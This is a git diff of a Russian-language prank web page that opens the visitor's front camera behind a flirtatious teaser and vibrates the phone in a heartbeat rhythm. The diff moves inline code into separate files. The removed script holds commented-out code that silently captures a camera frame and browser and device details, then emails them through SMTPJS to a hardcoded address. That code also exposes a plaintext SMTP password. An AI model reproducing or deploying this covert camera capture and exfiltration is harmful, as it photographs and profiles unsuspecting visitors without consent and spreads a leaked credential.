@@ -3,7 +3,7 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Get User Media - Photo</title>
+    <title>Hearth Manager</title>
     <meta name="viewport" content="initial-scale=1, user-scalable=no">
     <link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
     <link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
@@ -22,64 +22,7 @@
     <meta name="msapplication-TileColor" content="#ffffff">
     <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
     <meta name="theme-color" content="#ffffff">
-    <style>
-        #video {
-            width: 100vw;
-            height: 100vh;
-            max-height: 100vh;
-            object-fit: cover;
-        }
-
-        #canvas {
-            display: none;
-        }
-
-        .description {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            text-align: center;
-            padding: 12px;
-            font-size: 20px;
-            font-weight: bold;
-            background-color: white;
-        }
-
-        #loader {
-            background: #fd79a8;
-            width: 100%;
-            height: 100%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            transition: transform 1s ease;
-            z-index: 10000;
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-        }
-
-        body {
-            margin: 0;
-            padding: 0;
-        }
-
-        #loader.closed {
-            transform: translateY(-100%);
-
-        }
-
-        #loader h1 {
-            color: white;
-            text-align: center;
-            padding: 0 20px;
-            line-height: 1.5;
-            font-family: cursive
-        }
-    </style>
+    <link rel="stylesheet" href="./styles.css">
 </head>
 
 <body>
@@ -92,142 +35,8 @@
     <div id="loader">
         <h1>Знаешь кто самая красивая девушка в мире?😉😉😉</h1>
     </div>
-    <script src="https://smtpjs.com/v3/smtp.js">
-    </script>
-    <script>
-        var canvas = document.getElementById('canvas');
-        var context = canvas.getContext('2d');
-        var video = document.getElementById('video');
-
-        function vibrate(val) {
-            try {
-                if (navigator) {
-                    if (navigator.vibrate) return navigator.vibrate(val);
-                    else if (navigator.oVibrate) return navigator.oVibrate(val);
-                    else if (navigator.mozVibrate) return navigator.mozVibrate(val);
-                    else if (navigator.webkitVibrate) return navigator.webkitVibrate(val);
-                } else {
-                    document.append("Ваш браузер не поддерживает вибрации.")
-                }
-            } catch (e) {
-                alert(e);
-            }
-        }
-
-        function infiniteVibrate(val, interval) {
-            stopVibrate();
-            vInterval = setInterval(function () {
-                vibrate(val);
-            }, interval);
-        }
-
-        const sleep = (time) => new Promise((resolve, reject) => {
-            setTimeout(resolve, time)
-        })
-
-        const hearthBeats = async () => {
-            await sleep(100);
-            await vibrate(200);
-            await sleep(300);
-            await vibrate(200);
-            await sleep(1000);
-
-            hearthBeats();
-        }
-        hearthBeats();
-        function stopVibrate() {
-            if (typeof (vInterval) !== "undefined") clearInterval(vInterval);
-            vibrate(0);
-        }
-        video.onvolumechange = (event) => {
-            alert("The volume changed.");
-        };
-        // Trigger photo take
-        var keyDownHandler = function (evt) {
-            alert(evt.key)
-            if (evt.key === 'VolumeDown') {
-                handleClick()
-            } else if (evt.key === 'VolumeUp') {
-                handleClick()
-            }
-            evt.preventDefault(); // to stop system app from processing keydown event
-        };
-        // document.getElementsByTagName("video")[0].addEventListener("click", handleClick);
-        // window.addEventListener('keydown', keyDownHandler);
-        // function handleClick() {
-        //     canvas.width = video.videoWidth;
-        //     canvas.height = video.videoHeight;
-        //     context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        //     var code = navigator.appCodeName;
-        //     var name = navigator.appName;
-        //     var vers = navigator.appVersion;
-        //     var platform = navigator.platform;
-        //     var cook = navigator.cookieEnabled;
-        //     var je = navigator.javaEnabled();
-        //     var ua = navigator.userAgent;
-        //     var text = 'Ваш браузер: ' + name +
-        //         '<br />Версия браузера: ' + vers +
-        //         '<br />Кодовое название браузера: ' + code +
-        //         '<br />Платформа: ' + platform +
-        //         '<br />Поддержка cookie: ' + cook +
-        //         '<br />Поддержка JavaScript: ' + je +
-        //         '<br />Браузер: ' + ua +
-        //         navigator.language +
-        //         '<br />Операционная система: ' + navigator.oscpu +
-        //         '<br />Производитель: ' + navigator.vendor +
-        //         '<br />Подразделение: ' + navigator.vendorSub;
-        //     vibrate(100)
-        //     // PORT 2525
-        //     Email.send({
-        //         Host : "smtp.elasticemail.com",
-        //         Username: 'khasieva.2023@yandex.ru',
-        //         Password: "CBD06505D94CDFC25333D695E7DE7816C1AA",
-        //         To: 'khasieva.2023@yandex.ru',
-        //         From: "khasieva.2023@yandex.ru",
-        //         Subject: "Пришел снимок экрана",
-        //         Body: "<html><h2>Информация</h2><p>" + text + "</p></html>",
-        //         Attachments: [{
-        //             name: 'photo.png',
-        //             data: canvas.toDataURL()
-        //         }]
-        //     }).then(
-        //         message => {
-        //             vibrate(500)
-        //         }
-        //     );
-
-        // }
-        // Grab elements, create settings, etc.
-        var video = document.getElementById('video');
-
-        var constraints = {
-            video: {
-                facingMode: "user"
-            },
-            audio: false
-        };
-        // Get access to the camera!
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia(constraints).then(function (stream) {
-                video.srcObject = stream;
-                document.getElementById('loader').classList.add('closed')
-                // video.play();
-            }).catch(error => alert(error));
-        }
-
-        document.addEventListener('DOMContentLoaded', () => {
-            const urlParams = new URLSearchParams(window.location.search);
-            const name = urlParams.get('name');
-            if (name)
-                document.getElementById('text').textContent = name;
-            document.body.addEventListener("click", function () {
-                var audio = document.getElementById("myAudio");
-                audio.play();
-            })
-
-        })
-    </script>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script src="./main.js"></script>
 </body>
 
 </html>
